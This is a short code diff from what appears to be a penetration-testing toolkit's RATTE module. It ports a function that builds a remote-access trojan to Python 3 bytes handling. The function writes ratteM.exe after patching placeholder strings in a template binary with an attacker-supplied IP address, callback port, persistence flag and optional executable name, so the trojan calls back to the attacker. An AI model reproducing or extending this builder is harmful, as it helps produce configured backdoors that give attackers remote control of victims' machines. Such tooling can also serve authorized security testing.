@@ -42,16 +42,22 @@ def prepare_ratte(ipaddr, ratteport, persistent, customexe):
     ############
     with open(os.path.join(core.userconfigpath, "ratteM.exe"), "wb") as filewrite:
 
-        host = (len(ipaddr) + 1) * "X"
-        r_port = (len(str(ratteport)) + 1) * "Y"
-        pers = (len(str(persistent)) + 1) * "Z"
+        host = ((len(ipaddr) + 1) * "X").encode("ascii")
+        r_port = ((len(str(ratteport)) + 1) * "Y").encode("ascii")
+        pers = ((len(str(persistent)) + 1) * "Z").encode("ascii")
         # check ob cexe > 0, sonst wird ein Feld gepatcht (falsch!)
         if customexe:
-            cexe = (len(str(customexe)) + 1) * "Q"
+            cexe = ((len(str(customexe)) + 1) * "Q").encode("ascii")
         else:
-            cexe = ""
+            cexe = None
 
-        filewrite.write(data.replace(cexe, customexe + "\x00", 1).replace(pers, persistent + "\x00", 1).replace(host, ipaddr + "\x00", 1).replace(r_port, str(ratteport) + "\x00", 1))
+        patched = data
+        if cexe is not None:
+            patched = patched.replace(cexe, (customexe + "\x00").encode("utf-8"), 1)
+        patched = patched.replace(pers, (persistent + "\x00").encode("utf-8"), 1)
+        patched = patched.replace(host, (ipaddr + "\x00").encode("utf-8"), 1)
+        patched = patched.replace(r_port, (str(ratteport) + "\x00").encode("utf-8"), 1)
+        filewrite.write(patched)
 
         # filewrite.write(data.replace(str(host), ipaddr+"\x00", 1).replace(str(rPort), str(ratteport)+"\x00", 1) )
         # filewrite.write(data.replace(str(pers), persistent+"\x00", 1).replace(str(host), ipaddr+"\x00", 1).replace(str(rPort), str(ratteport)+"\x00", 1) )
